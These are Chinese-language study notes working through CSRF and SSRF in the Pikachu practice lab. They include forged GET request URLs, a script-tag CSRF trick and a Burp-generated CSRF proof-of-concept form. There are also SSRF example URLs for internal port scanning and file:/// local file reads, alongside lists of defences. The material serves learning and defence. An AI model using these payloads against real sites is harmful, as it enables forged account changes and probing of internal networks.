<a name="vh8hz"></a>
## 一、CSRF漏洞
![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628736689756-eec2955f-a3da-40a6-81f0-383c4e8d541f.png#clientId=uf3ea7103-69e4-4&from=paste&id=u8fbe8433&originHeight=661&originWidth=1117&originalType=binary&ratio=1&size=236817&status=done&style=none&taskId=udad21e37-1e98-48aa-8f1b-ebe9006f193)
```bash
#CSRF 漏洞解释，原理等
#CSRF 漏洞检测，案例，防御等

#防御方案
1、当用户发送重要的请求时需要输入原始密码
2、设置随机 Token
3、检验 referer 来源，请求时判断请求链接是否为当前管理员正在使用的页面（管理员在编辑文章，
黑客发来恶意的修改密码链接，因为修改密码页面管理员并没有在操作，所以攻击失败）
4、设置验证码
5、限制请求方式只能为 POST

```

<a name="jBjrI"></a>
### pikachu上csrf验证
![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628741315246-f7602c18-bdb0-494c-beae-7eb3d1de47cc.png#clientId=uf3ea7103-69e4-4&from=paste&id=uf57b3ead&originHeight=520&originWidth=1387&originalType=binary&ratio=1&size=45925&status=done&style=none&taskId=u5873876c-4c06-4ac7-80af-ccbc5484ee1)<br />抓包<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628741370866-1f9de601-07d6-430a-a7a8-a9e93c13faef.png#clientId=uf3ea7103-69e4-4&from=paste&height=140&id=ub808b2f2&originHeight=280&originWidth=1645&originalType=binary&ratio=1&size=64898&status=done&style=none&taskId=ud6a658c1-c48c-4a9d-99b5-7d0ef0c2f36&width=822.5)<br />看到的是get提交的数据包`/vul/csrf/csrfget/csrf_get_edit.php?sex=gg&phonenum=1111&add=11111&email=111111&submit=submit`也就是说可以这样直接伪造提交的数据包从而就该服务器内容。

发送数据包`[http://10.1.1.7/vul/csrf/csrfget/csrf_get_edit.php?sex=22&phonenum=2222222&add=222222&email=22222222&submit=submit](http://10.1.1.7/vul/csrf/csrfget/csrf_get_edit.php?sex=22&phonenum=2222222&add=222222&email=22222222&submit=submit)`<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628741513995-22dac39a-76a3-444b-b676-f05ec1b67b45.png#clientId=uf3ea7103-69e4-4&from=paste&height=266&id=u9969af38&originHeight=532&originWidth=1611&originalType=binary&ratio=1&size=61113&status=done&style=none&taskId=u336e97f3-f85e-45d7-bb63-3385ec8b2d7&width=805.5)<br />伪造服务器点击`<script src="[http://10.1.1.7/vul/csrf/csrfget/csrf_get_edit.php?sex=33&phonenum=3333333&add=333333&email=33333333&submit=submit"></script>](http://10.1.1.7/vul/csrf/csrfget/csrf_get_edit.php?sex=33&phonenum=3333333&add=333333&email=33333333&submit=submit"></script>)`<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628741782391-302f59c5-e901-425f-95d3-08c99a850e13.png#clientId=uf3ea7103-69e4-4&from=paste&height=246&id=u62d2729a&originHeight=491&originWidth=1665&originalType=binary&ratio=1&size=66929&status=done&style=none&taskId=u10d7bf02-6796-4e11-96ca-3aa421626e9&width=832.5)
<a name="I8eiO"></a>
### burpsuit 生成Poc
![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628765230429-dc1be236-1e6e-4656-ae14-bab3a762eeff.png#clientId=uf3ea7103-69e4-4&from=paste&height=270&id=u5be63585&originHeight=539&originWidth=1614&originalType=binary&ratio=1&size=71068&status=done&style=none&taskId=ub449f5eb-f5ce-406d-9c50-7eaf1e20085&width=807)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628765036191-3ff271a4-5922-4851-8b0f-74dc7c5841fc.png#clientId=uf3ea7103-69e4-4&from=paste&height=521&id=ubfd8add7&originHeight=1042&originWidth=1920&originalType=binary&ratio=1&size=236532&status=done&style=none&taskId=u3dfb3260-e576-439d-9e4a-1c45fc351b7&width=960)<br />复制poc代码修改表单中的内容。然后放在服务器当中访问如修改为以下代码
```bash
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://10.1.1.7/vul/csrf/csrfget/csrf_get_edit.php">
      <input type="hidden" name="sex" value="@" />
      <input type="hidden" name="phonenum" value="@@@@1" />
      <input type="hidden" name="add" value="@@@@@@1" />
      <input type="hidden" name="email" value="@@@@@1" />
      <input type="hidden" name="submit" value="submit" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628765360652-07756e53-bb0c-4011-852a-3b384bd2e310.png#clientId=uf3ea7103-69e4-4&from=paste&id=u9e87faae&originHeight=227&originWidth=1184&originalType=binary&ratio=1&size=18312&status=done&style=none&taskId=uf92e2449-c4f2-4597-a491-ce15d11bb4a)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628765405223-48ae322b-5cf4-41b9-9d66-2089476b8629.png#clientId=uf3ea7103-69e4-4&from=paste&height=227&id=u2714bf19&originHeight=454&originWidth=1669&originalType=binary&ratio=1&size=64082&status=done&style=none&taskId=u64a708a0-044d-4030-b985-1bcf96c1f9d&width=834.5)
<a name="XeGjS"></a>
### csrf防护
```bash
1、当用户发送重要的请求时需要输入原始密码
2、设置随机 Token
3、检验 referer 来源，请求时判断请求链接是否为当前管理员正在使用的页面（管理员在编辑文章，
黑客发来恶意的修改密码链接，因为修改密码页面管理员并没有在操作，所以攻击失败）
4、设置验证码
5、限制请求方式只能为 POST
```
**token防护**
```bash
GET /vul/csrf/csrftoken/token_get_edit.php?sex=gg&phonenum=1111&add=11111&email=11111&token=45096611500a646562638549385&submit=submit HTTP/1.1
Host: 10.1.1.7
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.1.1.7/vul/csrf/csrftoken/token_get_edit.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=p9f3jfbnbc7cucobc9djsukon3
Connection: close
```
从上面可以看到的是token随机字符串用来验证数据包的唯一性，由于数据包的唯一性也就导致csrf漏洞几乎不能被利用

**referer**
```bash
GET /vul/csrf/csrfget/csrf_get_edit.php?sex=%40&phonenum=%40%40%40%401&add=%40%40%40%40%40%401&email=%40%40%40%40%401&submit=submit HTTP/1.1
Host: 10.1.1.7
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.1.1.6/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=p9f3jfbnbc7cucobc9djsukon3
Connection: close



GET /vul/csrf/csrftoken/token_get_edit.php?sex=gg&phonenum=18428312222&add=1111111111111&email=857920461%40qq.com&token=15916611501d79dd97514223645&submit=submit HTTP/1.1
Host: 10.1.1.7
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.1.1.7/vul/csrf/csrftoken/token_get_edit.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=p9f3jfbnbc7cucobc9djsukon3
Connection: close


```
可以看到的是上面两个数据包referer来源是不一样的也就是说可以通过这样的方式来防止csrf漏洞，但是这种方式是不安全的因为可以通过抓包的方式修改referer值。

<a name="gp6PT"></a>
## 二、SSRF
原理：[https://www.cnblogs.com/happystudyhuan/p/11802961.html](https://www.cnblogs.com/happystudyhuan/p/11802961.html)
```bash
SSRF漏洞介绍：

　　SSRF漏洞（服务器端请求伪造）：是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）。

 

SSRF漏洞原理：

　　SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。利用的是服务端的请求伪造。SSRF是利用存在缺陷的web应用作为代理攻击远程和本地的服务器。

 

SSRF漏洞利用手段：

　　1.可以对外网、内网、本地进行端口扫描，某些情况下端口的Banner会回显出来（比如3306的）；

　　2.攻击运行在内网或本地的有漏洞程序（比如溢出）；

　　3.可以对内网Web应用进行指纹识别，原理是通过请求默认的文件得到特定的指纹；

　　4.攻击内网或外网有漏洞的Web应用；

　　5.使用file：///协议读取本地文件(或其他协议）

　　http://www.xingkonglangzi.com/ssrf.php?url=192.168.1.10:3306

　　http://www.xingkonglangzi.com/ssrf.php?url=file:///c:/windows/win.ini

 

SSRF漏洞出现点：

　　1.分享：通过URL地址分享网页内容　　　　　　　　　　　　　　　　　　　　　　　　　　

　　2.转码服务（通过URL地址把原地址的网页内容调优，使其适合手机屏幕的浏览）

　　3.在线翻译

　　4.图片加载与下载：通过URL地址加载或下载图片

　　5.图片、文章收藏功能

　　6.未公开的api实现及调用URL的功能

　　7.从URL关键字中寻找
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628767052886-f2e8f0f0-6a76-49bb-ace4-e52e38d1d560.png#clientId=uf3ea7103-69e4-4&from=paste&id=u2ecb107e&originHeight=353&originWidth=638&originalType=binary&ratio=1&size=51864&status=done&style=none&taskId=u917dd012-4e71-410d-aa3c-3d7ca58fcbf)<br />![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628818773345-5dee00af-4c10-4952-a572-61b413c1b5ac.png#clientId=uf3ea7103-69e4-4&from=paste&id=ua00d33d0&originHeight=557&originWidth=884&originalType=url&ratio=1&status=done&style=none&taskId=uef8e0f6e-ef1e-4871-afe2-307d404f7e4)
<a name="PuqKD"></a>
### pikachu ssrf漏洞验证
第一步正常打开ssrf页面<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628820298645-ecd51cdd-d5ba-48aa-9ede-6183655507cf.png#clientId=uf3ea7103-69e4-4&from=paste&height=279&id=u9e94e9ad&originHeight=557&originWidth=1917&originalType=binary&ratio=1&size=102467&status=done&style=none&taskId=u4141b524-540c-4550-b925-bc77dcffc1e&width=958.5)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628820406085-a69d2c74-1069-443b-8f03-c2d4a1b04500.png#clientId=uf3ea7103-69e4-4&from=paste&height=122&id=uf42a0b97&originHeight=244&originWidth=1920&originalType=binary&ratio=1&size=44484&status=done&style=none&taskId=u49b27a01-0f3a-4aa4-a388-4c0afddfddb&width=960)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628820616537-f1f9b911-9221-4789-8d25-3cce2f0d1322.png#clientId=uf3ea7103-69e4-4&from=paste&height=240&id=u1adddc27&originHeight=480&originWidth=1695&originalType=binary&ratio=1&size=59802&status=done&style=none&taskId=u76b20158-5e01-4e69-a356-e29f987ec0b&width=847.5)<br />可以看到的是链接已经发生了变化`[http://10.1.1.7/vul/ssrf/ssrf_curl.php?url=http://127.0.0.1/vul/ssrf/ssrf_info/info1.php](http://10.1.1.7/vul/ssrf/ssrf_curl.php?url=http://127.0.0.1/vul/ssrf/ssrf_info/info1.php)`

第二步：我们可以把 url 中的内容改成内网的其他服务器上地址和端口，探测内网的其他信息，比如端口开放情况，下面这个例子就探测出[10.1.1.7](http://10.1.1.7/)这台机器开放了3306端口<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628820856823-d1c6cfd7-d0f8-47f0-b38a-6326b5373d82.png#clientId=uf3ea7103-69e4-4&from=paste&height=169&id=u2c395e3c&originHeight=337&originWidth=1755&originalType=binary&ratio=1&size=54554&status=done&style=none&taskId=u2e6f8667-9a49-4191-a0d4-a995b604c5b&width=877.5)

 
<a name="Hu21m"></a>
### SSRF（file_get_content）
![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628820988544-3c91f897-be74-4d44-bfd7-4c99a21ebe34.png#clientId=uf3ea7103-69e4-4&from=paste&id=u657f3f67&originHeight=566&originWidth=1360&originalType=binary&ratio=1&size=63834&status=done&style=none&taskId=u8252bdd4-36c8-434e-a969-b5d879d3191)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628821152164-acaf8fdc-a45c-4808-9bb8-3a489d7848df.png#clientId=uf3ea7103-69e4-4&from=paste&height=442&id=u897ad63f&originHeight=883&originWidth=1614&originalType=binary&ratio=1&size=191767&status=done&style=none&taskId=u4a6fc6b1-c82b-4d95-ba68-0d0b7101e4e&width=807)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628821222577-60cf57c3-4678-434d-8cf3-15b50a14266f.png#clientId=uf3ea7103-69e4-4&from=paste&height=190&id=u7f6afc33&originHeight=380&originWidth=1920&originalType=binary&ratio=1&size=118846&status=done&style=none&taskId=uee95162c-ef55-489b-b5fc-00c3948a552&width=960)
